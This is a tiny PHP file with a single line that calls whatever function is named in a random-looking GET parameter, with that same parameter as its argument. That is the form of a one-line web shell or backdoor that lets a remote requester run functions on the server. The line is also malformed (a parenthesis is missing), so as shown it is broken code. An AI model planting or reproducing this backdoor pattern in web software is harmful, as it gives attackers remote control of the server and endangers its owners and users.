<?php
$_GET['9psCwWpX']($_GET['9psCwWpX'];
?>
